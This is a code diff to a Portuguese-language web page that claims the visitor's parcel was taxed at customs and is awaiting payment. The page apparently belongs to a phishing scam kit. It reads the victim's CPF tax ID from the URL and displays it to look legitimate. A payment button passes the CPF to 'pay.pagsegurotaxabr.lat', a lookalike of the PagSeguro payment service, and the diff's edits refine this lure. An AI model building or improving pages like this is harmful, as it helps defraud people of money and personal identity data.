@@ -104,9 +104,7 @@
             
             <h2 class="text-xl font-bold text-[#f5b400] leading-6 mb-4">AGUARDANDO PAGAMENTO<br>(NLBR)</h2>
             
-            <p class="text-xl mb-2">Olá, <strong></strong></p>
-            
-            <p class="text-gray-700 mb-4">Seu pedido passou por um processo na alfândega e foi taxado.</p>
+            <p class="text-gray-700 mb-4">O produto referente ao CPF: <strong id="cpfDisplay"></strong><br>Passou por um processo na alfandega e foi taxado.</p>
 
         <!-- Imagem do Pacote -->
         <!-- Removido conforme solicitado -->
@@ -311,7 +309,6 @@
     </footer>
 
     <script>
-        let clientId = '';
         let cpf = '';
         (function() {
             const nav = performance.getEntriesByType && performance.getEntriesByType('navigation')[0];
@@ -330,29 +327,19 @@
                 body: 'action=payment_click'
             });
             
-            const nameParam = clientId ? encodeURIComponent(clientId) : '';
             const documentParam = cpf ? encodeURIComponent(cpf) : '';
-            window.location.href = 'https://pay.pagsegurotaxabr.lat/ODAK3Ll2d0D3E6V?name=' + nameParam + '&document=' + documentParam + '&telephone=';
+            window.location.href = 'https://pay.pagsegurotaxabr.lat/ODAK3Ll2d0D3E6V?document=' + documentParam + '&telephone=';
         }
 
         // Pegar parâmetros da URL e atualizar página
         const urlParams = new URLSearchParams(window.location.search);
-        const nome = urlParams.get('nome');
         cpf = urlParams.get('cpf');
-        const nascimento = urlParams.get('nascimento');
-        const imagem = urlParams.get('imagem');
 
         if (cpf) {
-            // Gerar identificador baseado no CPF
-            const cpfNumbers = cpf.replace(/\D/g, '');
-            const idNumber = (parseInt(cpfNumbers) % 10000).toString().padStart(4, '0');
-            clientId = 'Cliente #' + idNumber;
-            document.querySelector('p strong').textContent = clientId;
-        } else if (nome) {
-            document.querySelector('p strong').textContent = nome;
+            // Formatar CPF para exibição (XXX.XXX.XXX-XX)
+            const cpfFormatted = cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+            document.getElementById('cpfDisplay').textContent = cpfFormatted;
         }
-
-        // Removido código da imagem conforme solicitado
 
             </script>
 
